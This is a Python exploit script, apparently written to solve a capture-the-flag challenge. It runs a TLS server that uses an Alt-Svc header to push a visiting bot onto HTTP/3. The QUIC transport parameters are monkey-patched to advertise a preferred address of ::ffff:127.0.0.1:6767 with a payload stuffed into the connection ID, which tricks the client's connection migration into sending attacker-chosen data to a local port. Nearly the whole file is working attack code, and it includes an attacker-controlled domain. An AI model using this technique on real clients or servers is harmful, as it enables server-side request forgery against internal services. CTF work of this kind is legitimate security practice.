#!/usr/bin/env python3

import asyncio
import socket
import ssl
import threading

import aioquic.quic.connection as conn
from aioquic.asyncio import QuicConnectionProtocol, serve
from aioquic.h3.connection import H3Connection
from aioquic.h3.events import HeadersReceived
from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.events import ProtocolNegotiated
from aioquic.quic.packet import QuicPreferredAddress

CID = b"ive me the flag bro\n"  
Real = conn.QuicTransportParameters


def params(**kw):
    p = Real(**kw)
    p.preferred_address = QuicPreferredAddress(
        ipv4_address=None,
        ipv6_address=("::ffff:127.0.0.1", 6767),  
        connection_id=CID,
        stateless_reset_token=bytes(16),
    )
    return p

# PACKER FORM
#│ ipv4: 6 bytes de CEROS │ ipv6: ::ffff:7f00:0001 │ len  │ tu CID  │ token │
#│ (ranura vacía)         │ + puerto 6767          │ =20  │ 20 byte │ 16×00 │

conn.QuicTransportParameters = params
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain("certs/fullchain.pem", "certs/privkey.pem")
listen_socket = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
listen_socket.bind(("::", 443))
listen_socket.listen()


def tcp():
    while True:
        c, addr = listen_socket.accept()
        print(f"[tcp] conexión desde {addr[0]}", flush=True)
        try:
            c = ctx.wrap_socket(c, server_side=True)
            c.recv(65536)
            c.sendall(
                b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n"
                b'Alt-Svc: h3=":443"; ma=300\r\nContent-Length: 79\r\n\r\n'
                b"<script>fetch('/a');setTimeout(()=>fetch('/b'),400);setTimeout(()=>fetch('/c'),900)</script>"
            )
            c.close()
        except Exception:
            pass


threading.Thread(target=tcp, daemon=True).start()

class H3(QuicConnectionProtocol):
    def quic_event_received(self, event):
        if isinstance(event, ProtocolNegotiated):
            print("[h3] handshake recibido", flush=True)   # ← cada uno = el bot llegó por QUIC
            self.h3 = H3Connection(self._quic)
        if isinstance(event, ProtocolNegotiated):
            self.h3 = H3Connection(self._quic)  # crea streams de control + SETTINGS
        elif getattr(self, "h3", None):
            for ev in self.h3.handle_event(event):  # QUIC -> H3
                if isinstance(ev, HeadersReceived):
                    self.h3.send_headers(ev.stream_id, [(b":status", b"200")], end_stream=False)
                    self.h3.send_data(ev.stream_id, b"ok", end_stream=True)
        self.transmit()

#https://b0b17abf30c7ebc1.talk-to-the-locals.quest/
async def main():
    config = QuicConfiguration(is_client=False, alpn_protocols=["h3"])
    config.load_cert_chain("certs/fullchain.pem", "certs/privkey.pem")
    await serve("damik0ctf.duckdns.org", 443, configuration=config, create_protocol=H3)
    print("[+] sirviendo: https://damik0ctf.duckdns.org:443/  (h3 -> :443, migrate -> ::ffff:127.0.0.1:6767)")
    await asyncio.Future()


asyncio.run(main())
